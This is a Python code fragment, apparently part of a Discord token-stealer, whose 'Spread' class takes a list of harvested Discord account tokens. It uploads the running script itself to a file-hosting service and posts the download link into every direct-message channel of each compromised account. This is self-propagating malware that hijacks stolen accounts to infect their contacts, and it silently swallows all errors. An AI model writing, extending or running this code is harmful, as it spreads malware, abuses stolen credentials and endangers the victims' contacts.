class Spread:

    def __init__(self):
        self.message = "" # add custom message
        self.message += f"\n{self._link()}"
        try:
            for token in dtokens:
                self.give_me_head = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": token}
                self._DMALL(token)
        except:pass

    def _DMALL(self, token):
        try:
            chanID = requests.get("https://discord.com/api/v9/users/@me/channels", headers=self.give_me_head).json()
            for chan in chanID:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+chan['id']+'/messages',headers={"Authorization":token},data={"content": f"{self.message}"})
                except Exception as e:pass
        except Exception as e:pass

    def _link(self):
        return requests.post('https://api.anonfiles.com/upload',files={'file':open(sys.argv[0],"rb")}).json()['data']['file']['url']['full']